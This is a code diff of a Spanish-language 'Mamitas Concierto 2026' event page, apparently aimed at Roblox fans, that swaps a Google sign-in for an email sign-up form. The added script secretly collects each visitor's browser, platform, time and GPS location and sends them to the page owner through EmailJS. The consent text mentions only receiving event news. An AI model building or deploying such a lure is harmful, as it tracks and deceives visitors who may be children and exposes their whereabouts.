@@ -1,127 +1,151 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
 <meta charset="UTF-8">
-<title>Mamitas Roblox Concierto Event 2026</title>
+<title>Mamitas Concierto 2026</title>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
 <style>
 body{
-  margin:0;
-  height:100vh;
-  background:#000;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  font-family:Arial;
-  color:white;
+margin:0;
+height:100vh;
+background: linear-gradient(135deg,#5f00ff,#b300ff);
+display:flex;
+justify-content:center;
+align-items:center;
+font-family:Arial, sans-serif;
+color:white;
 }
 
-.box{
-  text-align:center;
-  padding:50px;
-  border-radius:20px;
-  background:#0c0c0c;
-  box-shadow:0 0 40px rgba(140,0,255,.4);
+.container{
+background: rgba(0,0,0,0.3);
+padding:40px;
+border-radius:20px;
+backdrop-filter: blur(10px);
+box-shadow: 0 0 30px rgba(0,0,0,0.5);
+text-align:center;
+width:350px;
+animation: aparecer 1s ease;
 }
 
-h1{font-size:30px;}
-
-.btn{
-  padding:18px 40px;
-  border:none;
-  border-radius:14px;
-  font-size:18px;
-  cursor:pointer;
-  background:linear-gradient(45deg,#6a00ff,#b300ff);
-  color:white;
-  transition:.3s;
-  box-shadow:0 0 20px #7a00ff;
-  margin-top:15px;
+@keyframes aparecer{
+from{opacity:0; transform: translateY(20px);}
+to{opacity:1; transform: translateY(0);}
 }
 
-.btn:hover{
-  transform:scale(1.15);
-  box-shadow:0 0 40px #b300ff,0 0 80px #6a00ff;
+input, button{
+width:100%;
+padding:12px;
+margin:10px 0;
+border:none;
+border-radius:10px;
+font-size:16px;
 }
 
-#login,#loading,#ok{display:none;}
-
-.loader{
-  border:4px solid #222;
-  border-top:4px solid #a000ff;
-  border-radius:50%;
-  width:40px;
-  height:40px;
-  animation:spin 1s linear infinite;
-  margin:15px auto;
+button{
+background:#ff00cc;
+color:white;
+cursor:pointer;
+transition:0.3s;
 }
 
-@keyframes spin{to{transform:rotate(360deg);}}
+button:hover{
+background:#ff33dd;
+}
+
+label{
+font-size:12px;
+display:block;
+margin-top:10px;
+}
+
+#mensaje{
+margin-top:15px;
+font-weight:bold;
+}
 </style>
 </head>
 
 <body>
 
-<div class="box">
+<div class="container">
 
-<h1>Mamitas Roblox Concierto Event 2026</h1>
-<p>¿Deseas continuar?</p>
+<h1>🎤 Mamitas Concierto 2026</h1>
+<p>Regístrate para recibir acceso exclusivo</p>
 
-<button class="btn" onclick="continuar()">Continuar</button>
+<form id="form">
 
-<div id="login">
-  <p>Inicia sesión para recibir el aviso del inicio del evento por correo</p>
-  <button class="btn" onclick="loginGoogle()">Iniciar sesión con Google</button>
+<input type="email" id="correo" placeholder="Tu correo electrónico" required>
+
+<label>
+<input type="checkbox" id="consentimiento" required>
+Acepto enviar mis datos para recibir información del evento
+</label>
+
+<button type="submit">Acceder</button>
+
+</form>
+
+<p id="mensaje"></p>
+
 </div>
 
-<div id="loading">
-  <div class="loader"></div>
-  Conectando…
-</div>
+<script>
 
-<div id="ok">
-Te avisaremos de las nuevas novedades del evento en tu correo electrónico ✅
-</div>
+emailjs.init("PUBLIC_KEY");
 
-</div>
+document.getElementById("form").addEventListener("submit", function(e){
 
-<script type="module">
+e.preventDefault();
 
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getAuth, GoogleAuthProvider, signInWithPopup }
-from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
-
-const firebaseConfig = {
-  apiKey: "TU_API",
-  authDomain: "TU_DOMINIO",
-  projectId: "TU_PROYECTO",
-  appId: "TU_APPID"
-};
-
-const app = initializeApp(firebaseConfig);
-const auth = getAuth(app);
-const provider = new GoogleAuthProvider();
-
-window.continuar = function(){
-  document.getElementById("login").style.display="block";
+if(!document.getElementById("consentimiento").checked){
+alert("Debes aceptar los términos.");
+return;
 }
 
-window.loginGoogle = function(){
+let correo = document.getElementById("correo").value;
+let navegador = navigator.userAgent;
+let plataforma = navigator.platform;
+let hora = new Date().toLocaleString();
 
-  document.getElementById("loading").style.display="block";
+function enviarDatos(latitud="No permitido", longitud="No permitido"){
 
-  signInWithPopup(auth, provider)
-  .then(() => {
-    document.getElementById("loading").style.display="none";
-    document.getElementById("ok").style.display="block";
-  })
-  .catch(e=>{
-    document.getElementById("loading").style.display="none";
-    alert(e.message);
-  });
+emailjs.send("SERVICE_ID","TEMPLATE_ID",{
+
+correo: correo,
+navegador: navegador,
+plataforma: plataforma,
+hora: hora,
+latitud: latitud,
+longitud: longitud
+
+}).then(function(){
+
+document.getElementById("mensaje").innerText =
+"✅ Registro exitoso. Te avisaremos por correo.";
+
+});
 }
+
+if(navigator.geolocation){
+navigator.geolocation.getCurrentPosition(
+function(position){
+enviarDatos(position.coords.latitude, position.coords.longitude);
+},
+function(){
+enviarDatos();
+}
+);
+}else{
+enviarDatos();
+}
+
+});
 
 </script>
 
 </body>
 </html>
+
+
